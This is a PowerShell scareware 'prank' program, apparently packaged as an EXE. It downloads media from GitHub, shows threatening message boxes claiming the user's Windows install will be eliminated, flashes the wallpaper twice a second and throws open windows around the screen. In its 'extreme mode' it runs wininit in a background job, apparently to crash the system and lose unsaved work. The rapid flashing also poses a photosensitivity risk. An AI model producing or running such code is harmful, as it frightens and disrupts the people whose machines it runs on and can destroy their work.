##[Ps1 To Exe]
##
##NcDBCIWOCzWE8paP3wFk4Fn9fmQkY8CPhZKox5Sx+uT4qBnPWpkbTVFLkDzyOFu8WvkTUvARiNQfUVMnP6Fr
##NcDBCIWOCzWE8paP3wFk4Fn9fmQkY8CPhZKox5Sx+uT4qBnPWpkbTVFLkDzyOFu8WvkTUvARiNcYRw4+Yf8bsdI=
##NcDBCIWOCzWE8paP3wFk4Fn9fmQkY8CPhZKox5Sx+uT4qBnPWpkbTVFLkDzyOFu8WvkTUvARiMYQWRE6LuIO8PzAFeDJ
##NcDBCIWOCzWE8paP3wFk4Fn9fmQkY8CPhZKox5Sx+uT4qBnPWpkbTVFLkDzyOFu8WvkTUvARiMcYURglYf8bttI=
##Kd3HDZOFADWE8uO1
##Nc3NCtDXTlGDjofG5iZk2UfhT20/UuGUrriry4C47Nb5j2vQSpV0
##Kd3HFJGZHWLWoLaVvnQnhQ==
##LM/RF4eFHHGZ7/K1
##K8rLFtDXTie5
##OsHQCZGeTiiZ4dI=
##OcrLFtDXTie5
##LM/BD5WYTiiZ4tI=
##McvWDJ+OTiiZ4tI=
##OMvOC56PFnzN8u+Vs1Q=
##M9jHFoeYB2Hc8u+Vs1Q=
##PdrWFpmIG2HcofKIo2QX
##OMfRFJyLFzWE8uK1
##KsfMAp/KUzWJ0g==
##OsfOAYaPHGbQvbyVvnQX
##LNzNAIWJGmPcoKHc7Do3uAuO
##LNzNAIWJGnvYv7eVvnQX
##M9zLA5mED3nfu77Q7TV64AuzAgg=
##NcDWAYKED3nfu77Q7TV64AuzAgg=
##OMvRB4KDHmHQvbyVvnQX
##P8HPFJGEFzWE8tI=
##KNzDAJWHD2fS8u+Vgw==
##P8HSHYKDCX3N8u+Vgw==
##LNzLEpGeC3fMu77Ro2k3hQ==
##L97HB5mLAnfMu77Ro2k3hQ==
##P8HPCZWEGmaZ7/K1
##L8/UAdDXTlGDjofG5iZk2UfhT20/UuGUuqOqwY+o7Nb6qCbWTZ8oT0F5qi/pCgW4Qfdy
##Kc/BRM3KXxU=
##
##
##fd6a9f26a06ea3bc99616d4851b372ba
# Set Title
$host.ui.RawUI.WindowTitle = "something"

# Load Types
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.ComponentModel
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Error Handler
function Get-Error ($where, $reason) {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("An error happened at $where. Failure at: $reason",'ERROR','Ok','Error')
    exit
}

# Background Changer
Function Set-WallPaper($Image) {
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

# Window Mover
Function Set-Window {
[cmdletbinding(DefaultParameterSetName='Name')]
Param (
    [parameter(Mandatory=$False,
        ValueFromPipelineByPropertyName=$True, ParameterSetName='Name')]
    [string]$ProcessName='*',
    [parameter(Mandatory=$True,
        ValueFromPipeline=$False,              ParameterSetName='Id')]
    [int]$Id,
    [int]$X,
    [int]$Y,
    [int]$Width,
    [int]$Height,
    [switch]$Passthru
)
Begin {
    Try { 
        [void][Window]
    } Catch {
    Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class Window {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetWindowRect(
            IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public extern static bool MoveWindow( 
            IntPtr handle, int x, int y, int width, int height, bool redraw);

        [DllImport("user32.dll")] 
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowWindow(
            IntPtr handle, int state);
        }
        public struct RECT
        {
        public int Left;        // x position of upper-left corner
        public int Top;         // y position of upper-left corner
        public int Right;       // x position of lower-right corner
        public int Bottom;      // y position of lower-right corner
        }
"@
    }
}
Process {
    $Rectangle = New-Object RECT
    If ( $PSBoundParameters.ContainsKey('Id') ) {
        $Processes = Get-Process -Id $Id -ErrorAction SilentlyContinue
    } else {
        $Processes = Get-Process -Name "$ProcessName" -ErrorAction SilentlyContinue
    }
    if ( $null -eq $Processes ) {
        If ( $PSBoundParameters['Passthru'] ) {
            Write-Warning 'No process match criteria specified'
        }
    } else {
        $Processes | ForEach-Object {
            $Handle = $_.MainWindowHandle
            Write-Verbose "$($_.ProcessName) `(Id=$($_.Id), Handle=$Handle`)"
            if ( $Handle -eq [System.IntPtr]::Zero ) { return }
            $Return = [Window]::GetWindowRect($Handle,[ref]$Rectangle)
            If (-NOT $PSBoundParameters.ContainsKey('X')) {
                $X = $Rectangle.Left            
            }
            If (-NOT $PSBoundParameters.ContainsKey('Y')) {
                $Y = $Rectangle.Top
            }
            If (-NOT $PSBoundParameters.ContainsKey('Width')) {
                $Width = $Rectangle.Right - $Rectangle.Left
            }
            If (-NOT $PSBoundParameters.ContainsKey('Height')) {
                $Height = $Rectangle.Bottom - $Rectangle.Top
            }
            If ( $Return ) {
                $Return = [Window]::MoveWindow($Handle, $x, $y, $Width, $Height,$True)
            }
            If ( $PSBoundParameters['Passthru'] ) {
                $Rectangle = New-Object RECT
                $Return = [Window]::GetWindowRect($Handle,[ref]$Rectangle)
                If ( $Return ) {
                    $Height      = $Rectangle.Bottom - $Rectangle.Top
                    $Width       = $Rectangle.Right  - $Rectangle.Left
                    $Size        = New-Object System.Management.Automation.Host.Size        -ArgumentList $Width, $Height
                    $TopLeft     = New-Object System.Management.Automation.Host.Coordinates -ArgumentList $Rectangle.Left , $Rectangle.Top
                    $BottomRight = New-Object System.Management.Automation.Host.Coordinates -ArgumentList $Rectangle.Right, $Rectangle.Bottom
                    If ($Rectangle.Top    -lt 0 -AND 
                        $Rectangle.Bottom -lt 0 -AND
                        $Rectangle.Left   -lt 0 -AND
                        $Rectangle.Right  -lt 0) {
                        Write-Warning "$($_.ProcessName) `($($_.Id)`) is minimized! Coordinates will not be accurate."
                    }
                    $Object = [PSCustomObject]@{
                        Id          = $_.Id
                        ProcessName = $_.ProcessName
                        Size        = $Size
                        TopLeft     = $TopLeft
                        BottomRight = $BottomRight
                    }
                    $Object
                }
            }
        }
    }
}
}

# Set Variables
$winver = ((Get-WmiObject -class Win32_OperatingSystem).Caption)
$installdate = (([WMI]'').ConvertToDateTime((Get-WmiObject Win32_OperatingSystem).InstallDate))
$extreme = [System.Windows.MessageBox]::Show("DO YOU WANT TO RUN WITH EXTREME MODE?",'Something','YesNo','64')
$TIC=(Get-ItemProperty 'HKCU:\Control Panel\Desktop' TranscodedImageCache -ErrorAction Stop).TranscodedImageCache
$currentbg = ([System.Text.Encoding]::Unicode.GetString($TIC) -replace '(.+)([A-Z]:[0-9a-zA-Z\\])+','$2')

Write-Host "Current Background Location: $currentbg"
Write-Host "Windows Version: $winver"
Write-Host "Install Date: $installdate"
Write-Host "Extreme Mode: $extreme"

# If the script started in AppData
$location = (Get-Location).Path
if ($location -contains "$env:appdata") {
	$Folder = "$env:appdata"
    $fun = $true
    Write-Host "Fun Mode: $fun"
} else {
	$Folder = "$env:temp\something"
    $parent = Test-Path -Path $Folder
    $fun = $false
    Write-Host "Fun Mode: $fun"
}

$where = "Location Checking"
Write-Host "Current Location: $location"
if ($null -eq $location) {
    Get-Error -where $where -reason "Current location does not exist."
}

# Check if ANY files exist in $Folder, which can either be the APPDATA folder or TEMP folder
$endmp3 = Test-Path -Path "$Folder\end.mp3" -PathType Leaf
$firstmp3 = Test-Path -Path $Folder\first.mp3 -PathType Leaf
$wallpaper = Test-Path -Path $Folder\wallpaper.png -PathType Leaf
$wallpaper2 = Test-Path -Path "$Folder\wallpaper-2.png" -PathType Leaf
$video = Test-Path -Path $Folder\video.mp4 -PathType Leaf
Write-Host "$endmp3" "$firstmp3" "$wallpaper" "$wallpaper2" "$video"

# Download if folder does not exist
if ($endmp3 -or $firstmp3 -or $wallpaper -or $video -or $parent -eq $false) {
    Write-Host "Downloading required files..."
    $where = "Downloading"
    if ($parent -eq $false) {
        New-Item -Path $Folder -ItemType Directory
    }
    Import-Module BitsTransfer
    $url1 = "https://github.com/Tonny2442/Fun/raw/main/packaged/end.mp3"
    $url2 = "https://github.com/Tonny2442/Fun/raw/main/packaged/first.mp3"
    $url3 = "https://github.com/Tonny2442/Fun/raw/main/packaged/video.mp4"
    $url4 = "https://github.com/Tonny2442/Fun/raw/main/packaged/wallpaper.png"

    $output1 = "$Folder\end.mp3"
    $output2 = "$Folder\first.mp3"
    $output3 = "$Folder\video.mp4"
    $output4 = "$Folder\wallpaper.png"

    $dl_endmp3 = "Start-BitsTransfer -Source $url1 -Destination $output1"
    $dl_firstmp3 = "Start-BitsTransfer -Source $url2 -Destination $output2"
    $dl_videomp4 = "Start-BitsTransfer -Source $url3 -Destination $output3"
    $dl_wallpaper = "Start-BitsTransfer -Source $url4 -Destination $output4"

    $dl_endmp3 += '; $Success=$?'
    $dl_firstmp3 += '; $Success=$?'
    $dl_videomp4 += '; $Success=$?'
    $dl_wallpaper += '; $Success=$?'

    if ($endmp3 -eq $false) {
        Invoke-Expression $dl_endmp3
        if ($success -eq $false) {
            Get-Error -where $where -reason "Failed to download end.mp3"
        }
    } elseif($firstmp3 -eq $false) {
        Invoke-Expression $dl_firstmp3
        if ($success -eq $false) {
            Get-Error -where $where -reason "Failed to download first.mp3"
        }
    } elseif($video -eq $false) {
        Invoke-Expression $dl_videomp4
        if ($success -eq $false) {
            Get-Error -where $where -reason "Failed to download video.mp4"
        }
    } elseif($wallpaper -eq $false) {
        Invoke-Expression $dl_wallpaper
        if ($success -eq $false) {
            Get-Error -where $where -reason "Failed to download wallpaper.png"
        }
    }
    Write-Host "End of downloading block"
}

$where = "Post Download Check"
# Do one last post-download check
$endmp3 = Test-Path -Path "$Folder\end.mp3" -PathType Leaf
$firstmp3 = Test-Path -Path $Folder\first.mp3 -PathType Leaf
$wallpaper = Test-Path -Path $Folder\wallpaper.png -PathType Leaf
$video = Test-Path -Path $Folder\video.mp4 -PathType Leaf
Write-Host "$endmp3" 
Write-Host "$firstmp3" 
Write-Host "$wallpaper" 
Write-Host "$video"

if ($endmp3 -and $firstmp3 -and $wallpaper -and $video -eq $true) {
    $downloaddone = $true
    Write-Host "Download Completed: $downloaddone"
} else {
    Get-Error -where $where -reason "Even after downloading, files did not exist."
}

$where = "Invert BG"
# Invert BG color only if it does not exist
if ($wallpaper2 -eq $false) {
    $arg = "$Folder\wallpaper.png"
    [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
    Get-ChildItem $arg | ForEach-Object {
        $image = New-Object System.Drawing.Bitmap($_.fullname)
        for ($y = 0; $y -lt $image.Height; $y++) {
            for ($x = 0; $x -lt $image.Width; $x++) {
                $pixelColor = $image.GetPixel($x, $y)
                $varR = 255 - $pixelColor.R
                $varG = 255 - $pixelColor.G
                $varB = 255 - $pixelColor.B
                $image.SetPixel($x, $y, [System.Drawing.Color]::FromArgb($varR, $varG, $varB))
            }
        }
        $image.MakeTransparent($image.GetPixel(10, 10))    
        $newFileName = $_.FullName -replace ".png", "-2.png"
        $image.Save($newFileName)
    }
}

$wallpaper2 = Test-Path -Path "$Folder\wallpaper-2.png" -PathType Leaf
if ($wallpaper2 -eq $false) {
    Get-Error -where $where -reason "Failed to invert wallpaper colors."
}

# Initialize mediaplayer
Add-Type -AssemblyName presentationCore
$mediaPlayer = New-Object system.windows.media.mediaplayer
$musicPath = "$Folder\first.mp3"
$mediaPlayer.open($musicPath)
$mediaPlayer.Play()

# Set Wallpaper and ask message boxes
Set-Wallpaper -Image "$Folder\wallpaper.png"
Add-Type -AssemblyName PresentationFramework
$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()
[System.Windows.MessageBox]::Show('Greetings.','????','Ok','64')
[System.Windows.MessageBox]::Show("I am $env:username.",'????','Ok','64')
[System.Windows.MessageBox]::Show('Thank you.','????','Ok','64')
[System.Windows.MessageBox]::Show('For running this file.','????','Ok','64')
[System.Windows.MessageBox]::Show('You awakened my energy.','????','Ok','64')
[System.Windows.MessageBox]::Show('There is nothing left to do.','????','Ok','64')
[System.Windows.MessageBox]::Show('This install of Windows, from','????','Ok','64')
[System.Windows.MessageBox]::Show("$installdate",'????','Ok','64')
[System.Windows.MessageBox]::Show('Will soon be none.','????','Ok','64')
[System.Windows.MessageBox]::Show('Now,','????','Ok','64')
$result1 = [System.Windows.MessageBox]::Show("Lets eliminate $winver, and move on to the next.",'????','YesNo','Error')

Write-Host "Understood: $result1"

# IF ANSWERED NO
if ($result1 -eq "No") {
    $mediaPlayer.stop()
	[System.Windows.MessageBox]::Show("Interesting.",'????','Ok','64')
	[System.Windows.MessageBox]::Show("You seem to believe you are above me, $env:username.",'????','Ok','64')
	[System.Windows.MessageBox]::Show("Since when did you control me?",'????','Ok','64')
}

# IF ANSWERED YES
if ($result1 -eq "Yes") {
    $mediaPlayer.stop()
	[System.Windows.MessageBox]::Show("I am happy you understand.",'????','Ok','64')
	[System.Windows.MessageBox]::Show("$env:username will be unstoppable.",'????','Ok','48')
}

# Begin Phase A
$shell.undominimizeall()
$musicPath = "$Folder\end.mp3"
$mediaPlayer.open($musicPath)
$mediaPlayer.Play()
Start-Process notepad.exe

## BG Changer Payload
Start-Job -Name BGChanger -ScriptBlock {
    if ($fun -eq 1) {
        $Folder = "$env:appdata\something"
    } else {
        $Folder = "$env:temp\something"
    }
	Function Set-WallPaper($Image) {
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}
	While ($true) {
			Set-Wallpaper $Folder\wallpaper.png
			Start-Sleep -Milliseconds 500
			Set-Wallpaper $Folder\wallpaper-2.png
			Start-Sleep -Milliseconds 500
		}
}

# Window Mover Time
$timeout = new-timespan -Seconds 3
$sw = [diagnostics.stopwatch]::StartNew()

## Window Mover Payload
While ($sw.elapsed -lt $timeout) {
	$xvalue = Get-Random -Minimum 0 -Maximum 1920
	$yvalue = Get-Random -Minimum 0 -Maximum 1080
	Get-Process | Where-Object {$_.mainWindowTitle} | Set-Window -Verbose -Passthru -X $xvalue -Y $yvalue
}

$mediaPlayer.stop()
## End Phase A

## Begin Phase B 
[xml]$XAML = @"
 
<Window Background="#00000000" xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="???????" Height="1920" Width="1080" ResizeMode="NoResize" WindowStyle="None"
		WindowStartupLocation="CenterScreen" WindowState="Maximized">
    <Grid Margin="0,0,0,0">
        <MediaElement Height="1920" Width="1080" Name="VideoPlayer" Stretch="Uniform" LoadedBehavior="Manual" UnloadedBehavior="Stop" Margin="0,0,0,0" />
    </Grid>
</Window>
"@
 
# Movie Path
$ActualSource = "$folder\video.mp4"
[uri]$VideoSource = "$ActualSource"
 
# Devide All Objects on XAML
$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName("VideoPlayer")
 
# Video Default Setting
$VideoPlayer.Volume = 100;
$VideoPlayer.Source = $VideoSource;
$VideoPlayer.Play()

$Script:Timer = New-Object System.Windows.Forms.Timer
$Timer.Interval = 1000
 
Function Timer_Tick()
 {
   --$Script:CountDown
   If ($Script:CountDown -lt 0)
   {
   $Timer.Stop(); 
   $Window.Close(); 
   $Timer.Dispose();
   $Script:CountDown = 3  
   }
    
    
 }
 
$Script:CountDown = 3
$Timer.Add_Tick({ Timer_Tick})
if ($extreme -eq "No") {
	$Timer.Start() 
}

Stop-Job -Name BGChanger
if ($extreme -eq "Yes") {
	Start-Job -Name BSODTimer -ScriptBlock {
		Start-Sleep -Milliseconds 1500
		wininit
	}
}

Start-Job -Name ErrorMsg -ScriptBlock {
	Add-Type -AssemblyName PresentationFramework
    Start-Sleep -Milliseconds 1300
	[System.Windows.MessageBox]::Show("Goodbye.",'????','Ok','Error')
}

#Show Up the Window 
$Window.ShowDialog() | out-null

if ($extreme -eq "No") {
	# Stop Jobs
	Get-Job | Stop-Job

	# Reset Wallpaper
	Set-Wallpaper $currentbg

	[System.Windows.MessageBox]::Show("Thank you for trying my wonderful EXE!",'????','Ok','Exclamation')
}